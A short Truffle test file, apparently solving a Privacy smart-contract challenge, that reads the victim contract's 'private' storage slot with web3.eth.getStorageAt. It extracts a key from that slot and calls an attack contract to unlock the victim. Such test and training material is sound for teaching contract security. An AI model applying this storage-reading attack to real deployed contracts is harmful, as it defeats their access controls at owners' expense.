const Privacy = artifacts.require("Privacy");
const PrivacyHack = artifacts.require("PrivacyHack");

contract("Privacy", async (accounts) => {
    let privacy;
    let privacyHack;

    before(async () => {
        // randomized bytes32[3]
        var data = ["0xf9c1906ab1561cd34b026c6d9596d40c70cbac8bb4447613c5ffb6f4817c93b8",
                    "0x7cb7de4ab38f85cc11607093f73849102816ccdbd79e1895dd77c8e51990f75b",
                    "0xc30750a294bda692f528bbf50da3d4abefcc5bfd33fdb796df81dd31fb2d6bee"];
        privacy = await Privacy.new(data);
        privacyHack = await PrivacyHack.new();

        let isLocked = await privacy.locked.call();
        assert.equal(isLocked, true, "victim not initialized correctly");
    });

    it("attacker should be able to unlock victim", async () => {
        let dataSlot = await web3.eth.getStorageAt(privacy.address, 3)
        let key = "0x" + dataSlot.substring(2 + (64/2), 2 + 64);
        
        await privacyHack.attack(privacy.address, key);

        let isLocked = await privacy.locked.call();
        assert.equal(isLocked, false, "attacker did not unlock victim");
    });
});